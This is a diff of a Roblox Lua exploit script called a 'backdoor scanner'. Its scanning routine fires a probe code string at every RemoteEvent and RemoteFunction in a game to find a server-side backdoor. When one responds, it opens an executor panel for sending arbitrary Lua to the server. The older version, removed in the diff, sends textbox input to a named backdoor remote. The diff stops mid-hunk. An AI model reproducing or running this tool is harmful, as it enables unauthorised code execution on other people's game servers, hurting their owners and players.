@@ -1,141 +1,511 @@
--- Gui to Lua
--- Version: 3.2
+--[=[
+ d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
+88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
+88      88    88    88            odD'      88      88    88 88ooo88 
+88  ooo 88    88    88          .88'        88      88    88 88~~~88 
+88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
+ Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
+]=]
 
--- Instances:
+-- Instances: 37 | Scripts: 6 | Modules: 0 | Tags: 0
+local G2L = {};
 
-local firetrips9sBackdoorScanner = Instance.new("ScreenGui")
-local Main = Instance.new("Frame")
-local TextLabel = Instance.new("TextLabel")
-local TextBox = Instance.new("TextBox")
-local Exe = Instance.new("TextButton")
-local Attach = Instance.new("TextButton")
-local AttachStatus = Instance.new("TextLabel")
-local Clr = Instance.new("TextButton")
+-- StarterGui.firetrips9backdoorscanner
+G2L["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
+G2L["1"]["Name"] = [[firetrips9backdoorscanner]];
+G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
 
---Properties:
 
-firetrips9sBackdoorScanner.Name = "firetrips9's Backdoor Scanner"
-firetrips9sBackdoorScanner.Parent = game.CoreGui
-firetrips9sBackdoorScanner.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-firetrips9sBackdoorScanner.ResetOnSpawn = false
+-- StarterGui.firetrips9backdoorscanner.ScanFrame
+G2L["2"] = Instance.new("Frame", G2L["1"]);
+G2L["2"]["BorderSizePixel"] = 0;
+G2L["2"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2"]["Size"] = UDim2.new(0, 453, 0, 258);
+G2L["2"]["Position"] = UDim2.new(0.34769, 0, 0.36307, 0);
+G2L["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2"]["Name"] = [[ScanFrame]];
 
-Main.Name = "Main"
-Main.Parent = firetrips9sBackdoorScanner
-Main.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-Main.BorderColor3 = Color3.fromRGB(0, 0, 0)
-Main.BorderSizePixel = 0
-Main.Position = UDim2.new(0.126984134, 0, 0.429276317, 0)
-Main.Size = UDim2.new(0, 473, 0, 222)
 
-TextLabel.Parent = Main
-TextLabel.BackgroundColor3 = Color3.fromRGB(46, 46, 46)
-TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
-TextLabel.BorderSizePixel = 0
-TextLabel.Size = UDim2.new(0, 473, 0, 50)
-TextLabel.Font = Enum.Font.SourceSans
-TextLabel.Text = "firetrips9's Backdoor Scanner"
-TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel.TextScaled = true
-TextLabel.TextSize = 14.000
-TextLabel.TextWrapped = true
-TextLabel.TextXAlignment = Enum.TextXAlignment.Left
-TextLabel.TextYAlignment = Enum.TextYAlignment.Top
+-- StarterGui.firetrips9backdoorscanner.ScanFrame.TextLabel
+G2L["3"] = Instance.new("TextLabel", G2L["2"]);
+G2L["3"]["TextWrapped"] = true;
+G2L["3"]["BorderSizePixel"] = 0;
+G2L["3"]["TextScaled"] = true;
+G2L["3"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["3"]["TextSize"] = 14;
+G2L["3"]["FontFace"] = Font.new([[rbxasset://fonts/families/PressStart2P.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["3"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["3"]["Size"] = UDim2.new(0, 453, 0, 50);
+G2L["3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["3"]["Text"] = [[firetrips9's Backdoor Scanner]];
 
-TextBox.Parent = Main
-TextBox.BackgroundColor3 = Color3.fromRGB(46, 46, 46)
-TextBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
-TextBox.BorderSizePixel = 0
-TextBox.Position = UDim2.new(0, 0, 0.423423409, 0)
-TextBox.Size = UDim2.new(0, 472, 0, 85)
-TextBox.ClearTextOnFocus = false
-TextBox.Font = Enum.Font.SourceSans
-TextBox.Text = ""
-TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-TextBox.TextSize = 14.000
-TextBox.TextXAlignment = Enum.TextXAlignment.Left
-TextBox.TextYAlignment = Enum.TextYAlignment.Top
 
-Exe.Name = "Exe"
-Exe.Parent = Main
-Exe.BackgroundColor3 = Color3.fromRGB(46, 46, 46)
-Exe.BorderColor3 = Color3.fromRGB(0, 0, 0)
-Exe.BorderSizePixel = 0
-Exe.Position = UDim2.new(0, 0, 0.873873889, 0)
-Exe.Size = UDim2.new(0, 141, 0, 28)
-Exe.Font = Enum.Font.SourceSans
-Exe.Text = "Execute"
-Exe.TextColor3 = Color3.fromRGB(255, 255, 255)
-Exe.TextScaled = true
-Exe.TextSize = 14.000
-Exe.TextWrapped = true
+-- StarterGui.firetrips9backdoorscanner.ScanFrame.TextLabel.UICorner
+G2L["4"] = Instance.new("UICorner", G2L["3"]);
 
-Attach.Name = "Attach"
-Attach.Parent = Main
-Attach.BackgroundColor3 = Color3.fromRGB(46, 46, 46)
-Attach.BorderColor3 = Color3.fromRGB(0, 0, 0)
-Attach.BorderSizePixel = 0
-Attach.Position = UDim2.new(0.348837197, 0, 0.873873889, 0)
-Attach.Size = UDim2.new(0, 141, 0, 28)
-Attach.Font = Enum.Font.SourceSans
-Attach.Text = "Attach"
-Attach.TextColor3 = Color3.fromRGB(255, 255, 255)
-Attach.TextScaled = true
-Attach.TextSize = 14.000
-Attach.TextWrapped = true
 
-AttachStatus.Name = "AttachStatus"
-AttachStatus.Parent = Main
-AttachStatus.BackgroundColor3 = Color3.fromRGB(46, 46, 46)
-AttachStatus.BorderColor3 = Color3.fromRGB(0, 0, 0)
-AttachStatus.BorderSizePixel = 0
-AttachStatus.Position = UDim2.new(0, 0, 0.225225225, 0)
-AttachStatus.Size = UDim2.new(0, 472, 0, 35)
-AttachStatus.Font = Enum.Font.SourceSans
-AttachStatus.Text = "Status: Not Attached"
-AttachStatus.TextColor3 = Color3.fromRGB(255, 255, 255)
-AttachStatus.TextScaled = true
-AttachStatus.TextSize = 14.000
-AttachStatus.TextWrapped = true
-AttachStatus.TextXAlignment = Enum.TextXAlignment.Left
-AttachStatus.TextYAlignment = Enum.TextYAlignment.Top
 
-Clr.Name = "Clr"
-Clr.Parent = Main
-Clr.BackgroundColor3 = Color3.fromRGB(46, 46, 46)
-Clr.BorderColor3 = Color3.fromRGB(0, 0, 0)
-Clr.BorderSizePixel = 0
-Clr.Position = UDim2.new(0.69978857, 0, 0.873873889, 0)
-Clr.Size = UDim2.new(0, 141, 0, 28)
-Clr.Font = Enum.Font.SourceSans
-Clr.Text = "Clear"
-Clr.TextColor3 = Color3.fromRGB(255, 255, 255)
-Clr.TextScaled = true
-Clr.TextSize = 14.000
-Clr.TextWrapped = true
+-- StarterGui.firetrips9backdoorscanner.ScanFrame.UICorner
+G2L["5"] = Instance.new("UICorner", G2L["2"]);
 
--- Scripts:
 
-local function MMJFG_fake_script() -- Main.UIHandler 
-	local script = Instance.new('LocalScript', Main)
 
-	script.Parent.Exe.Activated:Connect(function()
-		if not script.Parent.Attached.Value then
-			script.Parent.Exe.Text = "Attach first!"
-			wait(2)
-			script.Parent.Exe.Text = "Execute"
-		else
-			game:GetService('Players').LocalPlayer:FindFirstChild('myfatherleftme'):FireServer(script.Parent.TextBox.Text)
+-- StarterGui.firetrips9backdoorscanner.ScanFrame.TextButton
+G2L["6"] = Instance.new("TextButton", G2L["2"]);
+G2L["6"]["TextWrapped"] = true;
+G2L["6"]["BorderSizePixel"] = 0;
+G2L["6"]["TextSize"] = 14;
+G2L["6"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["6"]["TextScaled"] = true;
+G2L["6"]["BackgroundColor3"] = Color3.fromRGB(86, 255, 0);
+G2L["6"]["FontFace"] = Font.new([[rbxasset://fonts/families/PressStart2P.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["6"]["Size"] = UDim2.new(0, 431, 0, 196);
+G2L["6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["6"]["Text"] = [[Start Scanning]];
+G2L["6"]["Position"] = UDim2.new(0.02208, 0, 0.16279, 0);
+
+
+-- StarterGui.firetrips9backdoorscanner.ScanFrame.TextButton.UICorner
+G2L["7"] = Instance.new("UICorner", G2L["6"]);
+
+
+
+-- StarterGui.firetrips9backdoorscanner.ScanFrame.TextButton.LocalScript
+G2L["8"] = Instance.new("LocalScript", G2L["6"]);
+
+
+
+-- StarterGui.firetrips9backdoorscanner.ScanFrame.Dragify
+G2L["9"] = Instance.new("LocalScript", G2L["2"]);
+G2L["9"]["Name"] = [[Dragify]];
+
+
+-- StarterGui.firetrips9backdoorscanner.ExecFrame
+G2L["a"] = Instance.new("Frame", G2L["1"]);
+G2L["a"]["Visible"] = false;
+G2L["a"]["BorderSizePixel"] = 0;
+G2L["a"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["a"]["Size"] = UDim2.new(0, 453, 0, 258);
+G2L["a"]["Position"] = UDim2.new(0.34769, 0, 0.36307, 0);
+G2L["a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["a"]["Name"] = [[ExecFrame]];
+
+
+-- StarterGui.firetrips9backdoorscanner.ExecFrame.TextLabel
+G2L["b"] = Instance.new("TextLabel", G2L["a"]);
+G2L["b"]["TextWrapped"] = true;
+G2L["b"]["BorderSizePixel"] = 0;
+G2L["b"]["TextScaled"] = true;
+G2L["b"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["b"]["TextSize"] = 14;
+G2L["b"]["FontFace"] = Font.new([[rbxasset://fonts/families/PressStart2P.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["b"]["Size"] = UDim2.new(0, 453, 0, 50);
+G2L["b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["b"]["Text"] = [[firetrips9's Backdoor Scanner]];
+
+
+-- StarterGui.firetrips9backdoorscanner.ExecFrame.TextLabel.UICorner
+G2L["c"] = Instance.new("UICorner", G2L["b"]);
+
+
+
+-- StarterGui.firetrips9backdoorscanner.ExecFrame.UICorner
+G2L["d"] = Instance.new("UICorner", G2L["a"]);
+
+
+
+-- StarterGui.firetrips9backdoorscanner.ExecFrame.Dragify
+G2L["e"] = Instance.new("LocalScript", G2L["a"]);
+G2L["e"]["Name"] = [[Dragify]];
+
+
+-- StarterGui.firetrips9backdoorscanner.ExecFrame.Scroll
+G2L["f"] = Instance.new("ScrollingFrame", G2L["a"]);
+G2L["f"]["BorderSizePixel"] = 0;
+G2L["f"]["CanvasSize"] = UDim2.new(0, 376, 0, 20);
+G2L["f"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
+G2L["f"]["Name"] = [[Scroll]];
+G2L["f"]["Size"] = UDim2.new(0.91703, 0, 0.60596, 0);
+G2L["f"]["ScrollBarImageColor3"] = Color3.fromRGB(64, 182, 255);
+G2L["f"]["Position"] = UDim2.new(0.0377, 0, 0.15012, 0);
+G2L["f"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
+G2L["f"]["ScrollBarThickness"] = 6;
+G2L["f"]["BackgroundTransparency"] = 0.5;
+
+
+-- StarterGui.firetrips9backdoorscanner.ExecFrame.Scroll.Code
+G2L["10"] = Instance.new("TextBox", G2L["f"]);
+G2L["10"]["CursorPosition"] = -1;
+G2L["10"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["10"]["BorderSizePixel"] = 0;
+G2L["10"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["10"]["TextSize"] = 14;
+G2L["10"]["Name"] = [[Code]];
+G2L["10"]["TextYAlignment"] = Enum.TextYAlignment.Top;
+G2L["10"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
+G2L["10"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["10"]["Selectable"] = false;
+G2L["10"]["MultiLine"] = true;
+G2L["10"]["AnchorPoint"] = Vector2.new(1, 0);
+G2L["10"]["ClearTextOnFocus"] = false;
+G2L["10"]["Size"] = UDim2.new(0.93537, 0, 1, 0);
+G2L["10"]["Position"] = UDim2.new(0.9791, 0, 0, 0);
+G2L["10"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
+G2L["10"]["Text"] = [[print("goodbye fucking world nobody likes you")]];
+G2L["10"]["BackgroundTransparency"] = 1;
+
+
+-- StarterGui.firetrips9backdoorscanner.ExecFrame.Scroll.Code.Globals_
+G2L["11"] = Instance.new("TextLabel", G2L["10"]);
+G2L["11"]["ZIndex"] = 2;
+G2L["11"]["BorderSizePixel"] = 0;
+G2L["11"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["11"]["TextYAlignment"] = Enum.TextYAlignment.Top;
+G2L["11"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["11"]["TextSize"] = 14;
+G2L["11"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["11"]["TextColor3"] = Color3.fromRGB(87, 157, 215);
+G2L["11"]["BackgroundTransparency"] = 1;
+G2L["11"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["11"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
+G2L["11"]["Text"] = [[print                                          ]];
+G2L["11"]["Name"] = [[Globals_]];
+
+
+-- StarterGui.firetrips9backdoorscanner.ExecFrame.Scroll.Code.Keywords_
+G2L["12"] = Instance.new("TextLabel", G2L["10"]);
+G2L["12"]["ZIndex"] = 2;
+G2L["12"]["BorderSizePixel"] = 0;
+G2L["12"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["12"]["TextYAlignment"] = Enum.TextYAlignment.Top;
+G2L["12"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["12"]["TextSize"] = 14;
+G2L["12"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["12"]["TextColor3"] = Color3.fromRGB(87, 157, 215);
+G2L["12"]["BackgroundTransparency"] = 1;
+G2L["12"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["12"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
+G2L["12"]["Text"] = [[                                               ]];
+G2L["12"]["Name"] = [[Keywords_]];
+
+
+-- StarterGui.firetrips9backdoorscanner.ExecFrame.Scroll.Code.RemoteHighlight_
+G2L["13"] = Instance.new("TextLabel", G2L["10"]);
+G2L["13"]["ZIndex"] = 2;
+G2L["13"]["BorderSizePixel"] = 0;
+G2L["13"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["13"]["TextYAlignment"] = Enum.TextYAlignment.Top;
+G2L["13"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["13"]["TextSize"] = 14;
+G2L["13"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["13"]["TextColor3"] = Color3.fromRGB(113, 255, 228);
+G2L["13"]["BackgroundTransparency"] = 1;
+G2L["13"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["13"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
+G2L["13"]["Text"] = [[                                               ]];
+G2L["13"]["Name"] = [[RemoteHighlight_]];
+
+
+-- StarterGui.firetrips9backdoorscanner.ExecFrame.Scroll.Code.Strings_
+G2L["14"] = Instance.new("TextLabel", G2L["10"]);
+G2L["14"]["ZIndex"] = 2;
+G2L["14"]["BorderSizePixel"] = 0;
+G2L["14"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["14"]["TextYAlignment"] = Enum.TextYAlignment.Top;
+G2L["14"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["14"]["TextSize"] = 14;
+G2L["14"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["14"]["TextColor3"] = Color3.fromRGB(215, 158, 134);
+G2L["14"]["BackgroundTransparency"] = 1;
+G2L["14"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["14"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
+G2L["14"]["Text"] = [[      "goodbye fucking world nobody likes you" ]];
+G2L["14"]["Name"] = [[Strings_]];
+
+
+-- StarterGui.firetrips9backdoorscanner.ExecFrame.Scroll.Code.Numbers_
+G2L["15"] = Instance.new("TextLabel", G2L["10"]);
+G2L["15"]["ZIndex"] = 2;
+G2L["15"]["BorderSizePixel"] = 0;
+G2L["15"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["15"]["TextYAlignment"] = Enum.TextYAlignment.Top;
+G2L["15"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["15"]["TextSize"] = 14;
+G2L["15"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["15"]["TextColor3"] = Color3.fromRGB(182, 207, 169);
+G2L["15"]["BackgroundTransparency"] = 1;
+G2L["15"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["15"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
+G2L["15"]["Text"] = [[                                               ]];
+G2L["15"]["Name"] = [[Numbers_]];
+
+
+-- StarterGui.firetrips9backdoorscanner.ExecFrame.Scroll.Code.Comments_
+G2L["16"] = Instance.new("TextLabel", G2L["10"]);
+G2L["16"]["ZIndex"] = 2;
+G2L["16"]["BorderSizePixel"] = 0;
+G2L["16"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["16"]["TextYAlignment"] = Enum.TextYAlignment.Top;
+G2L["16"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["16"]["TextSize"] = 14;
+G2L["16"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["16"]["TextColor3"] = Color3.fromRGB(88, 167, 75);
+G2L["16"]["BackgroundTransparency"] = 1;
+G2L["16"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["16"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
+G2L["16"]["Text"] = [[                                               ]];
+G2L["16"]["Name"] = [[Comments_]];
+
+
+-- StarterGui.firetrips9backdoorscanner.ExecFrame.Scroll.Code.Custom_
+G2L["17"] = Instance.new("TextLabel", G2L["10"]);
+G2L["17"]["ZIndex"] = 2;
+G2L["17"]["BorderSizePixel"] = 0;
+G2L["17"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["17"]["TextYAlignment"] = Enum.TextYAlignment.Top;
+G2L["17"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["17"]["TextSize"] = 14;
+G2L["17"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["17"]["TextColor3"] = Color3.fromRGB(98, 176, 240);
+G2L["17"]["BackgroundTransparency"] = 1;
+G2L["17"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["17"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
+G2L["17"]["Text"] = [[]];
+G2L["17"]["Name"] = [[Custom_]];
+
+
+-- StarterGui.firetrips9backdoorscanner.ExecFrame.Scroll.Code.Tokens_
+G2L["18"] = Instance.new("TextLabel", G2L["10"]);
+G2L["18"]["ZIndex"] = 2;
+G2L["18"]["BorderSizePixel"] = 0;
+G2L["18"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["18"]["TextYAlignment"] = Enum.TextYAlignment.Top;
+G2L["18"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["18"]["TextSize"] = 14;
+G2L["18"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["18"]["TextColor3"] = Color3.fromRGB(181, 181, 181);
+G2L["18"]["BackgroundTransparency"] = 1;
+G2L["18"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["18"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
+G2L["18"]["Text"] = [[     (                                        )]];
+G2L["18"]["Name"] = [[Tokens_]];
+G2L["18"]["Position"] = UDim2.new(0, 0, 0.00507, 0);
+
+
+-- StarterGui.firetrips9backdoorscanner.ExecFrame.Scroll.Code.UICorner
+G2L["19"] = Instance.new("UICorner", G2L["10"]);
+
+
+
+-- StarterGui.firetrips9backdoorscanner.ExecFrame.Scroll.Lines
+G2L["1a"] = Instance.new("TextLabel", G2L["f"]);
+G2L["1a"]["BorderSizePixel"] = 0;
+G2L["1a"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["1a"]["TextYAlignment"] = Enum.TextYAlignment.Top;
+G2L["1a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1a"]["TextSize"] = 14;
+G2L["1a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1a"]["BackgroundTransparency"] = 1;
+G2L["1a"]["Size"] = UDim2.new(0.02891, 0, 1, 0);
+G2L["1a"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
+G2L["1a"]["Text"] = [[1
+]];
+G2L["1a"]["Name"] = [[Lines]];
+
+
+-- StarterGui.firetrips9backdoorscanner.ExecFrame.Scroll.LLine
+G2L["1b"] = Instance.new("Frame", G2L["f"]);
+G2L["1b"]["ZIndex"] = 50;
+G2L["1b"]["BorderSizePixel"] = 0;
+G2L["1b"]["BackgroundColor3"] = Color3.fromRGB(82, 82, 82);
+G2L["1b"]["Size"] = UDim2.new(0, 1, 1, 0);
+G2L["1b"]["Position"] = UDim2.new(0.035, 0, 0, 0);
+G2L["1b"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
+G2L["1b"]["Name"] = [[LLine]];
+
+
+-- StarterGui.firetrips9backdoorscanner.ExecFrame.Scroll.LLine.UICorner
+G2L["1c"] = Instance.new("UICorner", G2L["1b"]);
+
+
+
+-- StarterGui.firetrips9backdoorscanner.ExecFrame.Scroll.Editor
+G2L["1d"] = Instance.new("LocalScript", G2L["f"]);
+G2L["1d"]["Name"] = [[Editor]];
+
+
+-- StarterGui.firetrips9backdoorscanner.ExecFrame.Scroll.UICorner
+G2L["1e"] = Instance.new("UICorner", G2L["f"]);
+
+
+
+-- StarterGui.firetrips9backdoorscanner.ExecFrame.TextButton
+G2L["1f"] = Instance.new("TextButton", G2L["a"]);
+G2L["1f"]["TextWrapped"] = true;
+G2L["1f"]["BorderSizePixel"] = 0;
+G2L["1f"]["TextSize"] = 14;
+G2L["1f"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1f"]["TextScaled"] = true;
+G2L["1f"]["BackgroundColor3"] = Color3.fromRGB(86, 255, 0);
+G2L["1f"]["FontFace"] = Font.new([[rbxasset://fonts/families/PressStart2P.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1f"]["Size"] = UDim2.new(0, 201, 0, 31);
+G2L["1f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1f"]["Text"] = [[Execute]];
+G2L["1f"]["Position"] = UDim2.new(0.03753, 0, 0.75581, 0);
+
+
+-- StarterGui.firetrips9backdoorscanner.ExecFrame.TextButton.UICorner
+G2L["20"] = Instance.new("UICorner", G2L["1f"]);
+
+
+
+-- StarterGui.firetrips9backdoorscanner.ExecFrame.TextButton.LocalScript
+G2L["21"] = Instance.new("LocalScript", G2L["1f"]);
+
+
+
+-- StarterGui.firetrips9backdoorscanner.ExecFrame.TextButton
+G2L["22"] = Instance.new("TextButton", G2L["a"]);
+G2L["22"]["TextWrapped"] = true;
+G2L["22"]["BorderSizePixel"] = 0;
+G2L["22"]["TextSize"] = 14;
+G2L["22"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["22"]["TextScaled"] = true;
+G2L["22"]["BackgroundColor3"] = Color3.fromRGB(0, 255, 255);
+G2L["22"]["FontFace"] = Font.new([[rbxasset://fonts/families/PressStart2P.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["22"]["Size"] = UDim2.new(0, 201, 0, 31);
+G2L["22"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["22"]["Text"] = [[Clear]];
+G2L["22"]["Position"] = UDim2.new(0.50993, 0, 0.75581, 0);
+
+
+-- StarterGui.firetrips9backdoorscanner.ExecFrame.TextButton.UICorner
+G2L["23"] = Instance.new("UICorner", G2L["22"]);
+
+
+
+-- StarterGui.firetrips9backdoorscanner.ExecFrame.TextButton.LocalScript
+G2L["24"] = Instance.new("LocalScript", G2L["22"]);
+
+
+
+-- StarterGui.firetrips9backdoorscanner.ExecFrame.Remote
+G2L["25"] = Instance.new("ObjectValue", G2L["a"]);
+G2L["25"]["Name"] = [[Remote]];
+
+
+-- StarterGui.firetrips9backdoorscanner.ScanFrame.TextButton.LocalScript
+local function C_8()
+local script = G2L["8"];
+	local guid = game:GetService('HttpService'):GenerateGUID(false)
+	backdoorcode = ([[
+					local model = Instance.new('Model')
+					model.Name = '%s'
+					model.Parent=workspace
+					]]):format(guid)
+	local RobloxReplicatedStorage = game:GetService("RobloxReplicatedStorage")
+	local ReplicatedStorage = game:GetService("ReplicatedStorage")
+	local JointsService = game:GetService("JointsService")
+	local StarterGui = game:GetService("StarterGui")
+	local dateTimeNow = DateTime.now
+	local tableFind = table.find
+	local taskSpawn = task.spawn
+	local taskWait = task.wait
+	local stringRep = string.rep
+	local LocalPlayer = game:GetService('Players').LocalPlayer
+	local function harked()
+		local backpack = LocalPlayer.Backpack 
+		return backpack:FindFirstChild("HandlessSegway") and
+			backpack.HandlessSegway:FindFirstChild("RemoteEvents") and
+			backpack.HandlessSegway.RemoteEvents:FindFirstChild("DestroySegway")
+	end
+	local function emmaBackdoor(rm)
+		local Parent = rm.Parent
+		return rm.Name == "emma" and Parent and Parent.Name == "mynameemma" and Parent.Parent == ReplicatedStorage
+	end
+	script.Parent.Activated:Connect(function()
+		script.Parent.Text = "Scanning....."
+		local function validRemote(rm)
+			local Parent = rm.Parent
+	
+			if getfenv().blacklisted then
+				if tableFind(getfenv().blacklisted, rm:GetFullName()) then return false end
+			end
+			if Parent then
+				if Parent == JointsService then return false end
+	
+				-- Adonis Check
+				if (Parent == ReplicatedStorage and rm:FindFirstChild("__FUNCTION")) or
+					(rm.Name == "__FUNCTION" and Parent.ClassName == "RemoteEvent" and Parent.Parent == ReplicatedStorage) then return false end
+	
+				if (Parent.ClassName == "Folder" and Parent.Name == "DefaultChatSystemChatEvents" and Parent.Parent == ReplicatedStorage) then return false end
+			end
+	
+			if rm:IsDescendantOf(RobloxReplicatedStorage) then return false end
+	
+			return true
+		end
+		do
+			local DescendantsList = game:GetDescendants()
+			for index=1, #DescendantsList do
+				local remote = DescendantsList[index]
+	
+				if not validRemote(remote) then continue end
+				if remote.ClassName ~= "RemoteEvent" then continue end
+	
+				if emmaBackdoor(remote) then
+					remote:FireServer(backdoorcode)
+				end
+				remote:FireServer(backdoorcode)
+				wait(2)
+				if workspace:FindFirstChild(guid) then
+					script.Parent.Parent.Parent.ExecFrame.Remote.Value = remote
+					script.Parent.Parent.Parent.ExecFrame.Visible = true
+					script.Parent.Parent.Visible = false
+					return
+				end
+			end
+			taskWait(2)
+			for index=1, #DescendantsList do
+				local remote = DescendantsList[index]
+	
+				if not validRemote(remote) then continue end
+				if remote.ClassName ~= "RemoteFunction" then continue end
+	
+				local waiting = true
+				taskSpawn(function()
+					remote:InvokeServer(backdoorcode)
+					waiting = nil
+				end)
+	
+				-- If RemoteFunction don't respond in 1 second, we skip this one.
+				local start = dateTimeNow().UnixTimestampMillis
+				while waiting and 1000 > dateTimeNow().UnixTimestampMillis - start do
+					taskWait()
+				end
+			end
+			taskWait(2)
+			if workspace:FindFirstChild(guid) then
+				script.Parent.Parent.Parent.ExecFrame.Remote.Value = remote
+				script.Parent.Parent.Parent.ExecFrame.Visible = true
+				script.Parent.Parent.Visible = false
+				return
+			end
+		end
+		if workspace:FindFirstChild(guid) then
+			script.Parent.Parent.Parent.ExecFrame.Remote.Value = remote
+			script.Parent.Parent.Parent.ExecFrame.Visible = true
+			script.Parent.Parent.Visible = false
+			return
 		end
 	end)
-	script.Parent.Clr.Activated:Connect(function()
-		script.Parent.TextBox.Text = ''
-	end)
-	
-end
-coroutine.wrap(MMJFG_fake_script)()
-local function JWGMHOP_fake_script() -- Main.Dragify 
-	local script = Instance.new('LocalScript', Main)
-
+end;
+task.spawn(C_8);
+-- StarterGui.firetrips9backdoorscanner.ScanFrame.Dragify
+local function C_9()
+local script = G2L["9"];
 	local UIS = game:GetService("UserInputService")
 	function dragify(Frame)
 		dragToggle = nil
@@ -173,127 +543,562 @@ local function JWGMHOP_fake_script() -- Main.Dragify
 	end
 	dragify(script.Parent)
 	
-end
-coroutine.wrap(JWGMHOP_fake_script)()
-local function DQZGUYY_fake_script() -- Main.AttachHandler 
